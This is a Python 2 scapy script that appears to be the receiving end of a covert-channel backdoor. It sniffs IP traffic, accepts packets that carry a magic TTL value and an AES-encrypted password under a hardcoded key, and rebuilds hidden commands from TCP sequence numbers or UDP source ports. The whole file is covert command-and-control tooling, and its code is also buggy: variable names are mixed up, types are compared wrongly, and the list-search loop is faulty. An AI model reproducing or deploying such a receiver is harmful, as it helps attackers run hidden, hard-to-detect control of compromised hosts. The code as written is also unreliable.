from scapy.all import *
from Crypto.Cipher import AES
# Inputs
victimIP = "192.168.0.1"
ttlKey = 164
srcPort = 80
dstPort = 53
key = "0123456789abcdef"
IV = "abcdefghijklmnop"
commands = []
authentication = "TEST!"


def decrypt(command):
    global key
    global IV
    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain


def encryptCommand(command):
    global key
    global IV
    encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = encryptor.encrypt(command)
    return plain


def addToCommands(commands, UID, total, covertContent):
    # Edge case if command array is empty
    if(len(commands) == 0):
        print 'Commands is empty, creating a new element'
        element = [UID, [int(total)], [covertContent]]
        commands.append(element)
        print commands
        # The first element of COmmand has UID
        # print commands[0][1]
        # print "\n\n\n\n"
    # If the commands array is NOT empty, search by UID
    else:
        # find the element which has the same UID
        for element in commands:
            if(element[0] == UID):
                element[2].append(covertContent)
                # print commands
            # If NONE of the elements have the same UID, create a
            # new entry
            else:
                element = [UID, [int(total)], [covertContent]]
                commands.append(element)
            pass


def checkCommands(UID):
    for element in commands:
        print element
        if(element[0] == UID):
            total = element[1][0]
            print "The total amount of commands is " + str(total)
            numMessages = len(element[2])
            print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
            else:
                return False
        pass
        return False


def reconstructCommand(UID):
    for element in commands:
        # print element
        text = ""
        if(element[0] == UID):
            data = element[2]
            print data
            for value in data:
                text = text + str(value)
                pass
            print int(text)
        pass


def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = pkt[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == ttlKey:
        # Check the password in the payload
        payload = pkt["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        print "Packet payload " + decryptedData
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        print "Password: " + password
        if(password == authentication):
            return True
        else:
            return False
    return False


def handle(pkt):
    if authenticate(pkt):
        payload = pkt["Raw"].load
        UID = payload[1]
        position = payload[2].split(":")[0]
        total = payload[2].split(":")[1]

        if(packet.haslayer(TCP)):
            # decrypt the covert contents
            print "Covert content = " + str(pkt[TCP].seq)
            # convert to binary
            covertContent = bin(pkt[TCP].seq)[2:]
            print "binary is " + covertContent
        elif(packet.haslayer(UDP)):
            # decrypt the covert contents
            print "Covert content = " + str(pkt[UDP].sport)
            # convert to binary
            covertContent = bin(pkt[UDP].sport)[2:]
            print "binary is " + covertContent
        # If there is only 1 message for this command, reconstruct it
        if(total == 1):
            print "Only one message, just reconstruct it"
        # Else, add to an array
        else:
            addToCommands(commands, UID, total, covertContent)
            # After every add, check if the max has been reached
            if(checkCommands(UID)):
                print "Max reached, reconstruct command"
                reconstructCommand(UID)
            else:
                print "Max not reached, don't reconstruct command yet"

sniff(filter="ip", prn=handle)
